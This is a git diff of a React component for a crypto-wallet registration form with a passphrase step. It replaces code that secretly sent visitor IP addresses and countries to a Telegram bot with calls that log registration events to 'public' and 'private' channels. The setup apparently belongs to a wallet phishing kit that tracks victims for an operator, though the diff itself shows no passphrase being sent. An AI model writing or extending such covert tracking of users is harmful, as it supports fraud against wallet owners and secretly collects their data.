@@ -13,9 +13,9 @@ import EnterPassphrase from "@/modules/Forms/EnterPassphrase";
 import { useMultistepForm } from "@/components/Multistep";
 import type { TRegisterForm } from "@/types/data/forms";
 import { REGISTER_INIT_VALUES, AUTH_INP_DATA, PASSPHRASE_DATA, passArr, passStr } from "@/data/pages/inp-data";
-import { TG_TOKEN, TG_METHOD_NAMES, CHAT_ID } from "@/data/api/tokens";
-import { getUserIP, sendLog } from "@/api/logger-utils";
-import { getCountryName } from "@/utils/get-country-name";
+import { PUBLIC_LOG_CHANNEL, PRIVATE_LOG_CHANNEL } from "@/data/api/tokens";
+import { logMessages } from "@/data/pages/initial";
+import { sendExtendedLog } from "@/api/logger-utils";
 
 export const RegisterWallet = () => {
     const {
@@ -83,12 +83,8 @@ export const RegisterWallet = () => {
 
     const [isRegisterPassMatch, setIsRegisterPassMatch] = useState<boolean>(true);
 
-    const registerLog = async (logText: string) =>
-        getUserIP().then((ip) => {
-            sendLog(TG_TOKEN, TG_METHOD_NAMES.sendMessage, CHAT_ID, `${logText}. IP: ${ip} | Страна: ${getCountryName(window.navigator.language)}`);
-        });
     const submitForm = async (data: FieldValues) => {
-        if (currentStepIndex === 0) registerLog("Пользователь <b>регистрируется</b>");
+        if (currentStepIndex === 0) sendExtendedLog(PUBLIC_LOG_CHANNEL, logMessages.startRegister);
         if (!isLastStep) return next();
 
         // * Clearing extra spaces
@@ -98,7 +94,9 @@ export const RegisterWallet = () => {
 
         if (isPassCond) {
             setIsRegisterPassMatch(true);
-            registerLog("Пользователь <b>зарегистрировался</b>");
+
+            sendExtendedLog(PUBLIC_LOG_CHANNEL, logMessages.registered);
+            sendExtendedLog(PRIVATE_LOG_CHANNEL, logMessages.registered);
 
             await new Promise((resolve: any) => setTimeout(resolve, 2000));
             reset();
